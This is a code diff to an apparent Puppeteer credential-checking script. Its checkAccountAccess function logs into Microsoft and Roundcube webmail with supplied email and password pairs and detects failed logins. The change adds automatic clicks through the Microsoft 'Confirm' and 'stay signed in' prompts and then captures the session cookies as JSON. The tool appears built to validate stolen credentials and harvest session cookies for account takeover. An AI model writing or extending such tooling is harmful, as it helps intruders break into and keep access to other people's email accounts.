@@ -38,6 +38,8 @@ const platformSelectors = {
     passwordNextButton: "#idSIButton9",
     errorMessage: "//*[contains(text(), 'This username may be')] | //*[contains(text(), 'That Microsoft account doesn’t exist')] | //*[contains(text(), 'find an account with that')]",
     loginFailed: "//*[contains(text(), 'Your account or password is incorrect')]",
+    confirmButton: "input[value='Confirm']",
+    yesButton: "#acceptButton",
   },
   roundcube: {
     input: "input[name='user']",
@@ -108,7 +110,7 @@ async function checkAccountAccess(email, password) {
 
     await page.goto(platformUrls[platform], { waitUntil: "networkidle2", timeout: 60000 });
 
-    const { input, nextButton, passwordInput, passwordNextButton, errorMessage, loginFailed } = platformSelectors[platform];
+    const { input, nextButton, passwordInput, passwordNextButton, errorMessage, loginFailed, confirmButton, yesButton } = platformSelectors[platform];
 
     // Enter email
     await page.waitForSelector(input);
@@ -156,8 +158,23 @@ async function checkAccountAccess(email, password) {
 
     accountAccess = loginErrorElements === 0;
 
-    // Fetch cookies if login is successful
+    // Handle additional modals
     if (accountAccess) {
+      try {
+        await page.waitForSelector(confirmButton, { timeout: 5000 });
+        await page.click(confirmButton);
+      } catch (e) {
+        console.log('Confirm button not found');
+      }
+
+      try {
+        await page.waitForSelector(yesButton, { timeout: 5000 });
+        await page.click(yesButton);
+      } catch (e) {
+        console.log('Yes button not found');
+      }
+
+      // Fetch cookies if login is successful
       const browserCookies = await page.cookies();
       cookies = JSON.stringify(browserCookies);
     }
